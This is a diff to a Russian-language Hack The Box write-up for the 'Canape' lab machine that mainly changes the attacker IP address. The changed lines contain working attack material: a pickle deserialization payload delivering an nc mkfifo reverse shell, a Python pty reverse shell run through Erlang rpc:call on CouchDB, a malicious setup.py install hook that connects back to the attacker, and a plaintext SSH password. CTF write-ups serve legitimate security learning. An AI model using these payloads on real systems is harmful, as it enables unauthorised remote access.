@@ -15,7 +15,7 @@ comments: true
 ![canape-banner.png]({{ "/img/htb/boxes/canape/canape-banner.png" | relative_url }})
 
 <h4 style="color:red;margin-bottom:0;">Canape: 10.10.10.70</h4>
-<h4 style="color:red;">Attacker: 10.10.14.230</h4>
+<h4 style="color:red;">Attacker: 10.10.14.14</h4>
 
 * TOC
 {:toc}
@@ -366,7 +366,7 @@ def check():
 
 import cPickle, hashlib, requests
 
-LHOST = '10.10.14.230'
+LHOST = '10.10.14.14'
 LPORT = '31337'
 RHOST = '10.10.10.70'
 RPORT = '80'
@@ -405,7 +405,7 @@ print('POST {} {} {}'.format(r.status_code, r.url, data))
 В итоге запустив скрипт:
 ```text
 root@kali:~# python canape_shell.py
-POST 200 http://10.10.10.70:80/submit {'quote': "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.230 31337 >/tmp/f'\np2\ntRp3\n.", 'character': "cposix\nsystem\np1\n(S'c=krusty;"}
+POST 200 http://10.10.10.70:80/submit {'quote': "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 31337 >/tmp/f'\np2\ntRp3\n.", 'character': "cposix\nsystem\np1\n(S'c=krusty;"}
 POST 500 http://10.10.10.70:80/check {'id': 'a7055ae5d0703e84ea83e69eaef172b2'}
 ```
 
@@ -459,7 +459,7 @@ tcp        0      0 0.0.0.0:4369            0.0.0.0:*               LISTEN      
 ...
 ```
 
-Конечно, я знал, что ищу: из init-скрипта стало известно о том, что на сервере будет крутиться CouchDB, а если задуматься о название бокса (фр. canapé — "[канапе](https://ru.wikipedia.org/wiki/%D0%9A%D0%B0%D0%BD%D0%B0%D0%BF%D0%B5_(%D0%BC%D0%B5%D0%B1%D0%B5%D0%BB%D1%8C) "Канапе (мебель) — Википедия")"), все сразу станет на свои места.
+Конечно, я знал, что ищу: из init-скрипта стало известно о том, что на сервере будет крутиться CouchDB, а если задуматься о название бокса (фр. canapé — "[канапе](https://ru.wikipedia.org/wiki/Канапе_(мебель) "Канапе (мебель) — Википедия")"), все сразу станет на свои места.
 
 # Захват пользователя
 Мы знаем следующий шаг — это СУБД CouchDB (версии 2.0.0), найденная в запущенных процессах и слушающая свои дефолтные порты.
@@ -626,7 +626,7 @@ Eshell V7.3  (abort with ^G)
 (3V1LH4CK3R@canape)4> nodes().
 [couchdb@localhost]
 
-(3V1LH4CK3R@canape)5> rpc:call('couchdb@localhost', os, cmd, ["python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.230\",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\"HISTFILE\",\"/dev/null\");pty.spawn(\"/bin/bash\");s.close()'"]).
+(3V1LH4CK3R@canape)5> rpc:call('couchdb@localhost', os, cmd, ["python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.14\",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\"HISTFILE\",\"/dev/null\");pty.spawn(\"/bin/bash\");s.close()'"]).
 ```
 
 И последней командой получим свой реверс-шелл от пользователя homer:
@@ -656,7 +656,7 @@ bce91869????????????????????????
 # SSH — Порт 65535 (внутри машины)
 Подключимся к машине по SSH и сразу ринемся в бой — узнаем, что скрывает `sudo`:
 ```text
-root@kali:~# sshpass -p '0B4jyA0xtytZi7esBNGp' ssh -o StrictHostKeyChecking=no homer@10.10.10.70
+root@kali:~# sshpass -p '0B4jyA0xtytZi7esBNGp' ssh -oStrictHostKeyChecking=no homer@10.10.10.70
 homer@canape:~$ whoami
 homer
 
@@ -721,7 +721,7 @@ class Exploit(install):
 	def run(self):
 		import socket, os, pty
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect(('10.10.14.230', 1337))
+		s.connect(('10.10.14.14', 1337))
 		os.dup2(s.fileno(), 0)
 		os.dup2(s.fileno(), 1)
 		os.dup2(s.fileno(), 2)
